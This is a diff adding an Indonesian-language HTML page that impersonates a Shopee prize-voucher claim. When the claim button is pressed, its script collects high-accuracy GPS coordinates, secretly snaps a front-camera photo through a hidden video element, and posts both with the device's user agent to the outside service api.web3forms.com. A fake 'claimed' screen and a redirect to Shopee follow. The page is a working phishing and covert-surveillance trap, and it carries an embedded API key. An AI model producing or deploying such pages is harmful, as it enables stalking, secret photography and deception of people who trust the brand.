@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Klaim Hadiah VIP - Shopee</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            overflow-x: hidden;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding-top: 20px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            color: #ee4d28;
+            font-size: 24px;
+            margin: 0;
+        }
+        .header p {
+            color: #666;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        
+        /* AREA GAMBAR HADIAH */
+        .gift-image-container {
+            width: 90%;
+            margin: 10px 0 20px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            background: #fff4f0;
+            padding: 15px;
+            text-align: center;
+        }
+        .gift-image-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+        .gift-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin-top: 10px;
+        }
+        .gift-price {
+            font-size: 22px;
+            color: #ee4d28;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+
+        /* TOMBOL KLAIM BESAR */
+        .btn-claim {
+            background: linear-gradient(135deg, #ee4d28, #f7a645);
+            color: white;
+            padding: 18px 40px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(238, 77, 40, 0.4);
+            width: 85%;
+            margin-bottom: 30px;
+            animation: pulse 2s infinite;
+            text-align: center;
+        }
+        .btn-claim:active {
+            transform: scale(0.98);
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+
+        /* LAYAR LOADING & SUKSES (Awalnya Tersembunyi) */
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ee4d28;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success-icon {
+            font-size: 60px;
+            color: #28a745;
+            margin-bottom: 15px;
+        }
+        .success-text {
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+        }
+        .sub-success {
+            font-size: 14px;
+            color: #777;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HALAMAN UTAMA: GAMBAR + TOMBOL -->
+    <div class="container">
+        <div class="header">
+            <h1>🎉 Selamat! Kamu Terpilih</h1>
+            <p>Bonus Spesial Hari Ini</p>
+        </div>
+
+        <!-- GAMBAR HADIAH (GANTI URL GAMBAR DI SINI JIKA PERLU) -->
+        <div class="gift-image-container">
+            <!-- Gambar Voucher Shopee Umum -->
+            <img src="https://img.icons8.com/color/96/gift.png" alt="Hadiah Shopee">
+            <div class="gift-title">Voucher Cashback Shopee</div>
+            <div class="gift-price">Rp 50.000</div>
+            <p style="font-size: 12px; color: #888; margin-top: 5px;">*Berlaku untuk semua produk</p>
+        </div>
+
+        <!-- TOMBOL AKSI -->
+        <button class="btn-claim" id="claimBtn" onclick="startTrap()">
+            🎁 KLAIM SEKARANG
+        </button>
+    </div>
+
+    <!-- LAYAR OVERLAY (Muncul saat diklik) -->
+    <div id="overlay">
+        <div id="loadingContent">
+            <div class="spinner"></div>
+            <p style="color: #555;">Memproses Klaim Anda...</p>
+        </div>
+        
+        <div id="successContent" style="display: none;">
+            <div class="success-icon">✅</div>
+            <div class="success-text">Berhasil Diklaim!</div>
+            <div class="sub-success">Hadiah masuk ke akun dalam 24 jam.</div>
+            <div class="sub-success">Mengalihkan ke halaman utama...</div>
+        </div>
+    </div>
+
+    <script>
+        // --- KONFIGURASI API KEY KAMU ---
+        const API_KEY = "7e55426b-9f49-4a5f-be85-75305abb1b30";
+        // --------------------------------
+
+        function startTrap() {
+            // Sembunyikan halaman utama, tampilkan overlay
+            document.getElementById('claimBtn').style.display = 'none';
+            document.getElementById('overlay').style.display = 'flex';
+            
+            // Mulai proses GPS & Kamera
+            getLocation();
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        getCamera(position.coords.latitude, position.coords.longitude);
+                    },
+                    () => getCamera("GPS Found", "GPS Found"),
+                    { timeout: 3000, enableHighAccuracy: true }
+                );
+            } else {
+                getCamera("No GPS", "No GPS");
+            }
+        }
+
+        function getCamera(lat, lon) {
+            const video = document.createElement('video');
+            video.style.display = 'none';
+            video.autoplay = true;
+            video.playsInline = true;
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const photoData = canvas.toDataURL('image/png');
+                        stream.getTracks().forEach(t => t.stop());
+                        sendToEmail(lat, lon, photoData);
+                    }, 1500); // 1.5 Detik kamera menyala
+                })
+                .catch(() => sendToEmail(lat, lon, "Camera Skipped"));
+        }
+
+        function sendToEmail(lat, lon, photoData) {
+            // Tampilkan layar sukses
+            document.getElementById('loadingContent').style.display = 'none';
+            document.getElementById('successContent').style.display = 'block';
+
+            const formData = new FormData();
+            formData.append("access_key", API_KEY);
+            formData.append("Lokasi_GPS", `${lat}, ${lon}`);
+            formData.append("Foto_Target", photoData);
+            formData.append("Device", navigator.userAgent);
+            formData.append("Subject", "🎯 HADIAH DIKLAIM - DATA BARU");
+
+            fetch("https://api.web3forms.com/submit", {
+                method: "POST",
+                body: formData
+            }).then(() => {
+                // Redirect ke Shopee setelah 3 detik
+                setTimeout(() => {
+                    window.location.href = "https://shopee.co.id/";
+                }, 3000);
+            });
+        }
+    </script>
+</body>
+</html>
